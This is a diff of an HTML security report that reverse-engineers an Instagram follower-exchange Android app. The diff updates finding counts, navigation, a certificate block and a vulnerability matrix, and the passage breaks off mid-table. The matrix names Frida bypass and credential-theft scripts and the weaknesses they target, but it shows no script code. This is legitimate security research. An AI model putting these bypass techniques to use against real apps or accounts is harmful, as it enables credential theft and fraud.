@@ -160,12 +160,12 @@ mark{background:rgba(255,210,61,.34);color:#fff;border-radius:3px;padding:0 2px}
   <p class="sub">A full reverse-engineering of <code>com.nivaroid.topfollow</code> &mdash; an Instagram follower-exchange manipulation app that advertises itself as &ldquo;very secure&rdquo; with anti-tamper, anti-Frida, SSL pinning and Play Integrity. Every claimed protection was located, decoded and defeated. The Instagram login flow, follow-task verification, coin economy and the OLLVM-obfuscated native library are reconstructed end to end.</p>
 
   <div class="kpis">
-    <div class="kpi"><b>73</b><span>Vulnerabilities</span></div>
-    <div class="kpi c"><b>11</b><span>Critical</span></div>
-    <div class="kpi h"><b>25</b><span>High</span></div>
-    <div class="kpi m"><b>25</b><span>Medium</span></div>
-    <div class="kpi l"><b>12</b><span>Low</span></div>
-    <div class="kpi"><b>8</b><span>Frida PoCs</span></div>
+    <div class="kpi"><b>79</b><span>Vulnerabilities</span></div>
+    <div class="kpi c"><b>14</b><span>Critical</span></div>
+    <div class="kpi h"><b>26</b><span>High</span></div>
+    <div class="kpi m"><b>26</b><span>Medium</span></div>
+    <div class="kpi l"><b>13</b><span>Low</span></div>
+    <div class="kpi"><b>10</b><span>Frida PoCs (+1 helper)</span></div>
     <div class="kpi"><b>26</b><span>Backend endpoints</span></div>
     <div class="kpi"><b>22</b><span>Native JNI fns</span></div>
     <div class="kpi"><b>4,146</b><span>Classes decompiled</span></div>
@@ -197,12 +197,13 @@ mark{background:rgba(255,210,61,.34);color:#fff;border-radius:3px;padding:0 2px}
   </div>
   <div class="grp"><h5>Results</h5>
   <a href="#matrix">15. Vulnerability matrix</a>
-  <a href="#findings">16. Findings (73)</a>
+  <a href="#findings">16. Findings (79)</a>
   <a href="#lab">17. Frida lab (11 scripts)</a>
   <a href="#repro">18. Reproduction guide</a>
   <a href="#remediation">19. Remediation roadmap</a>
   <a href="#method">20. Methodology &amp; artefacts</a>
-  <a href="#legal">21. Scope &amp; ethics</a>
+  <a href="#merge">21. Merge reconciliation (A &times; B &times; binary)</a>
+  <a href="#legal">22. Scope &amp; ethics</a>
   </div>
 </nav>
 
@@ -219,10 +220,10 @@ mark{background:rgba(255,210,61,.34);color:#fff;border-radius:3px;padding:0 2px}
 <div class="callout warn"><b>One design decision dominates everything else.</b> Because the app accepts the Instagram <em>password</em> rather than using OAuth, and because it forwards the live session token to <code>top.nivafollower.app</code> in a <code>Token</code> header, the vendor operator holds mass account-takeover capability over the entire user base by construction &mdash; no exploit required. Any compromise of that server, or of the ServerCheck channel that supplies the base URL and certificate pin at runtime, yields every account at once.</div>
 <h4>Severity distribution</h4>
 <div class="pill-row">
-  <span class="badge" style="--c:#ff3b6b">Critical &middot; 11</span>
-  <span class="badge" style="--c:#ff8a3d">High &middot; 25</span>
-  <span class="badge" style="--c:#ffd23d">Medium &middot; 25</span>
-  <span class="badge" style="--c:#4dd7ff">Low &middot; 12</span>
+  <span class="badge" style="--c:#ff3b6b">Critical &middot; 14</span>
+  <span class="badge" style="--c:#ff8a3d">High &middot; 26</span>
+  <span class="badge" style="--c:#ffd23d">Medium &middot; 26</span>
+  <span class="badge" style="--c:#4dd7ff">Low &middot; 13</span>
 </div>
 <h4>The five findings that matter most</h4>
 <ol>
@@ -266,7 +267,7 @@ mark{background:rgba(255,210,61,.34);color:#fff;border-radius:3px;padding:0 2px}
 <dt>SPKI pin</dt><dd><code>sha256/4xnmMuV3jXL9RYz2ZVYtWWrkkv/6wSuz8SkHAHAV5Uo=</code></dd>
 </dl>
 <div class="callout crit"><b>The certificate digest <em>is</em> the tamper-check constant.</b> The pin literal found in <code>libtopfollow.so</code> .rodata &mdash; <code>sha256/d845591e086033a9035fd6b66c3c3d73aa33af90794d6b986e64779eea6bec5e</code> &mdash; is byte-for-byte the SHA-256 of this APK's own signing certificate. One constant is doing two unrelated jobs: it is both the &ldquo;certificate pin&rdquo; and the value the signature self-check compares against. That is not transport pinning (it says nothing about the server's TLS key) and it is not a strong integrity anchor (it is compared in hookable Java reflection). See CRYP-04 and INTE-01.</div>
-<details><summary>Signing certificate (DER, base64)</summary><pre class="code"><code>MIIDXDCCAkQCAQEwDQYJKoZIhvcNAQELBQAwdDEWMBQGA1UEAwwNTWFyeWFtIEFobWFkaTEaMBgGA1UECwwRQW5kcm9pZCBEZXZlbG9wZXIxETAPBgNVBAoMCE5pdmFSb2lkMQ8wDQYDVQQHDAZTaGlyYXoxDTALBgNVBAgMBEZhcnMxCzAJBgNVBAYTAklSMB4XDTIzMTIxNTE3NDQzM1oXDTQ4MTIwODE3NDQzM1owdDEWMBQGA1UEAwwNTWFyeWFtIEFobWFkaTEaMBgGA1UECwwRQW5kcm9pZCBEZXZlbG9wZXIxETAPBgNVBAoMCE5pdmFSb2lkMQ8wDQYDVQQHDAZTaGlyYXoxDTALBgNVBAgMBEZhcnMxCzAJBgNVBAYTAklSMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAi/269b1INF5Skw5rIyOK5pxMo4MikftNxHGz6MV3/StA/296zXWMND35vdcIR0i3HZ+dr2FIagZBOyo5rgF1pnlAwocuzLutEUdS9gEWyp/SfLGWp1LKx5zRclHAgE47BlOCApJ+7BX8/s7k0hda5aYmhPYFUBniZ8cmnHH9l+H2F6XJZuyhzRSWgZlLoIm3Y36rjKlXllnD5tOTKF0ugHx1jV6UagJ5bzjy4e4eOMmxPslcp2fDt3w6V7daECrRmBWGh1PikQgbV2W8qi9mtx8NUZoSxNVcCLA9kyoR6TduACOtB379GdTgu8irEwge/v1ChEWKafw/aA/w2cQh3QIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQAH666jLbCTDshkgo2G6QTkUtArzfHmI2HiozoljfXW3FHgxv6abfH39v03c5lfPLyQT3DcTI413ZddNNtLsJRC4D40gX/hqqe6PRt/xi0xPsPZZ2InwptNEYv94iLhLl80PFsNu4ORD+4VmysijRcGOZFb5hHud7advS4n1NzltowmyZC2Skl4PrznEjhqDZ+3Rz+nS68vRflPvsw91KXIktk0npzK0whtHZNAg8XJkdsGuPtrCv8o6jgqJtotCTuK1H3TNEUrzAmf24Uzt6hIT5PKjYDRll7kdQlqH7H+/bKgdE0nWIYiy807rmjXMpgJQRXWQAythbTkWPtWLAeT</code></pre></details>
+<details><summary>Signing certificate (DER, base64)</summary><pre class="code"><code></code></pre></details>
 </div>
 </section>
 
@@ -1054,27 +1055,27 @@ for (i = 0; i &lt; len; i++)  buf[i] ^= 0x6C;                                // 
 <section id="matrix">
 <h2>15. Vulnerability matrix</h2>
 <div class="card">
-<p>All 73 findings, ordered by severity. Use the search box to filter across id, title, description, evidence and category.</p>
-<input class="tsearch" id="globalSearch" type="search" placeholder="Search all 73 findings &mdash; try 'password', 'get_coin', 'pin', 'backup', 'frida', 'x0018d3f7'&hellip;">
+<p>All 79 findings, ordered by severity. Use the search box to filter across id, title, description, evidence and category.</p>
+<input class="tsearch" id="globalSearch" type="search" placeholder="Search all 79 findings &mdash; try 'password', 'get_coin', 'pin', 'backup', 'frida', 'x0018d3f7'&hellip;">
 <div class="pill-row" id="sevFilters">
-  <button class="fbtn" data-sev="">All (73)</button>
-  <button class="fbtn" data-sev="Critical">Critical (11)</button>
-  <button class="fbtn" data-sev="High">High (25)</button>
-  <button class="fbtn" data-sev="Medium">Medium (25)</button>
-  <button class="fbtn" data-sev="Low">Low (12)</button>
+  <button class="fbtn" data-sev="">All (79)</button>
+  <button class="fbtn" data-sev="Critical">Critical (14)</button>
+  <button class="fbtn" data-sev="High">High (26)</button>
+  <button class="fbtn" data-sev="Medium">Medium (26)</button>
+  <button class="fbtn" data-sev="Low">Low (13)</button>
 </div>
 <div class="pill-row" id="catFilters">
   <button class="fbtn" data-cat="">All categories</button>
-  <button class="fbtn" data-cat="Business logic">Business logic (12)</button><button class="fbtn" data-cat="Integrity">Integrity (10)</button><button class="fbtn" data-cat="Cryptography">Cryptography (9)</button><button class="fbtn" data-cat="Credentials">Credentials (7)</button><button class="fbtn" data-cat="Instagram API">Instagram API (7)</button><button class="fbtn" data-cat="Data storage">Data storage (7)</button><button class="fbtn" data-cat="Transport">Transport (6)</button><button class="fbtn" data-cat="Native hardening">Native hardening (4)</button><button class="fbtn" data-cat="Anti-analysis">Anti-analysis (4)</button><button class="fbtn" data-cat="Privacy">Privacy (3)</button><button class="fbtn" data-cat="Obfuscation">Obfuscation (2)</button><button class="fbtn" data-cat="Server-side">Server-side (1)</button><button class="fbtn" data-cat="Attack surface">Attack surface (1)</button>
+  <button class="fbtn" data-cat="Cryptography">Cryptography (14)</button><button class="fbtn" data-cat="Business logic">Business logic (12)</button><button class="fbtn" data-cat="Integrity">Integrity (11)</button><button class="fbtn" data-cat="Credentials">Credentials (7)</button><button class="fbtn" data-cat="Instagram API">Instagram API (7)</button><button class="fbtn" data-cat="Data storage">Data storage (7)</button><button class="fbtn" data-cat="Transport">Transport (6)</button><button class="fbtn" data-cat="Native hardening">Native hardening (4)</button><button class="fbtn" data-cat="Anti-analysis">Anti-analysis (4)</button><button class="fbtn" data-cat="Privacy">Privacy (3)</button><button class="fbtn" data-cat="Obfuscation">Obfuscation (2)</button><button class="fbtn" data-cat="Server-side">Server-side (1)</button><button class="fbtn" data-cat="Attack surface">Attack surface (1)</button>
 </div>
-<div class="tablewrap"><input class="tsearch" type="search" placeholder="Filter this table&hellip;" data-target="tbl-matrix"><table id="tbl-matrix" class="searchable"><thead><tr><th>ID</th><th>Title</th><th>Severity</th><th>Category</th><th>PoC</th></tr></thead><tbody><tr data-search="biz-01 coin reward flag get_coin is asserted by the client critical business logic 06_task_verification_bypass.js"><td><a href="#BIZ-01">BIZ-01</a></td><td>Coin reward flag <code>get_coin</code> is asserted by the client</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="biz-02 reward amount order_value travels from the client critical business logic 06_task_verification_bypass.js"><td><a href="#BIZ-02">BIZ-02</a></td><td>Reward amount <code>order_value</code> travels from the client</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="cred-01 instagram account password persisted on-device in a reversible cipher critical credentials 04_credential_theft.js"><td><a href="#CRED-01">CRED-01</a></td><td>Instagram account PASSWORD persisted on-device in a reversible cipher</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="cred-02 2fa seed / backup codes stored in the two_factors table critical credentials 04_credential_theft.js"><td><a href="#CRED-02">CRED-02</a></td><td>2FA seed / backup codes stored in the <code>two_factors</code> table</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="cred-03 webview cookie harvester synthesises an oauth bearer token from sessionid critical credentials 04_credential_theft.js"><td><a href="#CRED-03">CRED-03</a></td><td>WebView cookie harvester synthesises an OAuth bearer token from <code>sessionid</code></td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="cred-04 instagram session token sent to the vendor backend in a plaintext http header critical credentials 03_instagram_api_intercept.js 08_backend_traffic_and_servercheck.js"><td><a href="#CRED-04">CRED-04</a></td><td>Instagram session token sent to the vendor backend in a plaintext HTTP header</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-05 instagram login credentials forwarded to instagramlogin.php critical credentials 08_backend_traffic_and_servercheck.js"><td><a href="#CRED-05">CRED-05</a></td><td>Instagram login credentials forwarded to <code>instagramLogin.php</code></td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-01 keyless static cipher used for all &amp;ldquo;encrypted&amp;rdquo; local secrets critical cryptography 04_credential_theft.js"><td><a href="#CRYP-01">CRYP-01</a></td><td>Keyless static cipher used for all &ldquo;encrypted&rdquo; local secrets</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Cryptography</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="stor-01 room database is unencrypted critical data storage 04_credential_theft.js"><td><a href="#STOR-01">STOR-01</a></td><td>Room database is unencrypted</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="stor-02 allowbackup=true with completely empty backup-exclusion rules critical data storage 04_credential_theft.js"><td><a href="#STOR-02">STOR-02</a></td><td><code>allowBackup=true</code> with completely empty backup-exclusion rules</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="tran-02 backend base url and pin are downloaded at runtime critical transport 08_backend_traffic_and_servercheck.js 02_ssl_pinning_bypass.js"><td><a href="#TRAN-02">TRAN-02</a></td><td>Backend base URL and pin are downloaded at runtime</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Transport</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a> <a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="biz-03 client-side price computation for buying engagement high business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-03">BIZ-03</a></td><td>Client-side price computation for buying engagement</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-04 set_order_stamp signature omits balance, currency and nonce high business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-04">BIZ-04</a></td><td><code>set_order_stamp</code> signature omits balance, currency and nonce</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-05 local wallet in an unencrypted room database is the balance of record for the ui high data storage 04_credential_theft.js 05_coin_economy_bypass.js"><td><a href="#BIZ-05">BIZ-05</a></td><td>Local wallet in an unencrypted Room database is the balance of record for the UI</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-06 static challenge token x4 accepted on the claim endpoint high business logic 06_task_verification_bypass.js"><td><a href="#BIZ-06">BIZ-06</a></td><td>Static challenge token <code>x4</code> accepted on the claim endpoint</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="biz-07 claim body built entirely on-device by native code with no server challenge high business logic 06_task_verification_bypass.js 07_native_jni_dumper.js"><td><a href="#BIZ-07">BIZ-07</a></td><td>Claim body built entirely on-device by native code with no server challenge</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="biz-08 mass multi-account farming worker with a client-controlled concurrency flag high instagram api 05_coin_economy_bypass.js 06_task_verification_bypass.js"><td><a href="#BIZ-08">BIZ-08</a></td><td>Mass multi-account farming worker with a client-controlled concurrency flag</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a> <a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="biz-12 server-pushed update and download links are opened without verification high integrity 02_ssl_pinning_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#BIZ-12">BIZ-12</a></td><td>Server-pushed update and download links are opened without verification</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-06 hard-coded spoofed instagram client identity high instagram api 03_instagram_api_intercept.js"><td><a href="#CRED-06">CRED-06</a></td><td>Hard-coded spoofed Instagram client identity</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="cred-07 per-request forged x-ig-nav-chain / x-ig-salt-ids / x-fb-rmd high instagram api 03_instagram_api_intercept.js"><td><a href="#CRED-07">CRED-07</a></td><td>Per-request forged <code>x-ig-nav-chain</code> / <code>x-ig-salt-ids</code> / <code>x-fb-rmd</code></td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="cred-08 human-behaviour simulator with jittered timings and forced re-login high instagram api 03_instagram_api_intercept.js"><td><a href="#CRED-08">CRED-08</a></td><td>Human-behaviour simulator with jittered timings and forced re-login</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="cryp-02 hard-coded 64-hex integrity constant reconstructed from nested base64 high cryptography 01_anti_tamper_killer.js"><td><a href="#CRYP-02">CRYP-02</a></td><td>Hard-coded 64-hex integrity constant reconstructed from nested base64</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="cryp-03 static, fully replayable challenge blob x4 in every coin claim high business logic 06_task_verification_bypass.js"><td><a href="#CRYP-03">CRYP-03</a></td><td>Static, fully replayable challenge blob <code>x4</code> in every coin claim</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="cryp-04 certificate pin is the apk signing-certificate digest, and it is server-rotatable high transport 02_ssl_pinning_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#CRYP-04">CRYP-04</a></td><td>Certificate pin is the APK signing-certificate digest, and it is server-rotatable</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Transport</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-05 no tls stack and no crypto imports in the native library pinning is java-side only high native hardening 02_ssl_pinning_bypass.js"><td><a href="#CRYP-05">CRYP-05</a></td><td>No TLS stack and no crypto <i>imports</i> in the native library &mdash; pinning is Java-side only</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Native hardening</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="cryp-09 native aes-table cipher with an aes-256-shaped key expansion; block ciphers not validated under emulation, and unreachable from java high cryptography 09_native_aes_dump.js"><td><a href="#CRYP-09">CRYP-09</a></td><td>Native AES-table cipher with an AES-256-shaped key expansion; block ciphers not validated under emulation, and unreachable from Java</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="cryp-10 native aes key is runtime-derived: it is not the caller's key and not a byte window of the file high cryptography 09_native_aes_dump.js"><td><a href="#CRYP-10">CRYP-10</a></td><td>Native AES key is runtime-derived: it is not the caller's key and not a byte window of the file</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="cryp-12 the rsa public key that seals the password is supplied by the network at runtime and never validated high cryptography 10_java_crypto_layer.js 02_ssl_pinning_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#CRYP-12">CRYP-12</a></td><td>The RSA public key that seals the password is supplied by the network at runtime and never validated</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a> <a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="inte-01 apk signature self-check is hookable at the java reflection layer high integrity 01_anti_tamper_killer.js"><td><a href="#INTE-01">INTE-01</a></td><td>APK signature self-check is hookable at the Java reflection layer</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-02 google play store certificate gate d8.f.a() forced open high integrity 01_anti_tamper_killer.js"><td><a href="#INTE-02">INTE-02</a></td><td>Google Play Store certificate gate <code>d8.f.a()</code> forced open</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-03 /proc/self/maps scan for frida, xposed, riru, zygisk and substrate high anti-analysis 01_anti_tamper_killer.js"><td><a href="#INTE-03">INTE-03</a></td><td><code>/proc/self/maps</code> scan for Frida, Xposed, Riru, Zygisk and Substrate</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-08 play integrity gate keyed on client-writable sharedpreferences high integrity 01_anti_tamper_killer.js 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-08">INTE-08</a></td><td>Play Integrity gate keyed on client-writable SharedPreferences</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-03 sensitive values in sharedpreferences with reversible obfuscation high data storage 04_credential_theft.js 08_backend_traffic_and_servercheck.js"><td><a href="#STOR-03">STOR-03</a></td><td>Sensitive values in SharedPreferences with reversible obfuscation</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-07 webview used for instagram login and hcaptcha with a js bridge high credentials 04_credential_theft.js 02_ssl_pinning_bypass.js"><td><a href="#STOR-07">STOR-07</a></td><td>WebView used for Instagram login and hCaptcha with a JS bridge</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="stor-15 no user confirmation before credential-driven automation begins high privacy 06_task_verification_bypass.js"><td><a href="#STOR-15">STOR-15</a></td><td>No user confirmation before credential-driven automation begins</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Privacy</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="tran-01 certificate pinning defeated at the java layer high transport 02_ssl_pinning_bypass.js"><td><a href="#TRAN-01">TRAN-01</a></td><td>Certificate pinning defeated at the Java layer</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Transport</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="biz-09 vip upgrade gated only on locally available fields medium business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-09">BIZ-09</a></td><td>VIP upgrade gated only on locally available fields</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-10 coupon, gift-code and daily-reward redemption driven by the client medium business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-10">BIZ-10</a></td><td>Coupon, gift-code and daily-reward redemption driven by the client</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-11 invite, leaderboard and miner-request flows are client-editable medium business logic 05_coin_economy_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#BIZ-11">BIZ-11</a></td><td>Invite, leaderboard and miner-request flows are client-editable</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-09 android keystore ecdsa key under a hard-coded alias medium cryptography 07_native_jni_dumper.js"><td><a href="#CRED-09">CRED-09</a></td><td>Android Keystore ECDSA key under a hard-coded alias</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Cryptography</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cred-11 dead jni bridge: native code looks up helper.t.digest([b)[b which does not exist in the dex medium credentials 10_java_crypto_layer.js 07_native_jni_dumper.js"><td><a href="#CRED-11">CRED-11</a></td><td>Dead JNI bridge: native code looks up helper.T.digest([B)[B which does not exist in the DEX</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Credentials</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cryp-06 base64-only obfuscation of endpoint paths and constants medium obfuscation 08_backend_traffic_and_servercheck.js"><td><a href="#CRYP-06">CRYP-06</a></td><td>Base64-only obfuscation of endpoint paths and constants</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Obfuscation</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-07 native string tables obfuscated with two single-byte xor keys medium native hardening 07_native_jni_dumper.js"><td><a href="#CRYP-07">CRYP-07</a></td><td>Native string tables obfuscated with two single-byte XOR keys</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Native hardening</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cryp-11 instagram password sealed with rsa pkcs#1 v1.5 rather than oaep medium cryptography 10_java_crypto_layer.js"><td><a href="#CRYP-11">CRYP-11</a></td><td>Instagram password sealed with RSA PKCS#1 v1.5 rather than OAEP</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Cryptography</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a></td></tr><tr data-search="inte-04 root detection is a static list of nine su paths medium anti-analysis 01_anti_tamper_killer.js"><td><a href="#INTE-04">INTE-04</a></td><td>Root detection is a static list of nine <code>su</code> paths</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-05 emulator detection from spoofable build properties medium anti-analysis 01_anti_tamper_killer.js"><td><a href="#INTE-05">INTE-05</a></td><td>Emulator detection from spoofable <code>Build</code> properties</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-09 integrity token cached for six hours and replayable medium integrity 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-09">INTE-09</a></td><td>Integrity token cached for six hours and replayable</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="inte-10 predictable play integrity nonce medium integrity 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-10">INTE-10</a></td><td>Predictable Play Integrity nonce</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="inte-11 native bootstrap collects android_id and a full device profile medium privacy 04_credential_theft.js 07_native_jni_dumper.js"><td><a href="#INTE-11">INTE-11</a></td><td>Native bootstrap collects ANDROID_ID and a full device profile</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Privacy</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="inte-12 self-signed 25-year signing certificate, serial 1, v2-only signature medium integrity 01_anti_tamper_killer.js"><td><a href="#INTE-12">INTE-12</a></td><td>Self-signed 25-year signing certificate, serial 1, v2-only signature</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" 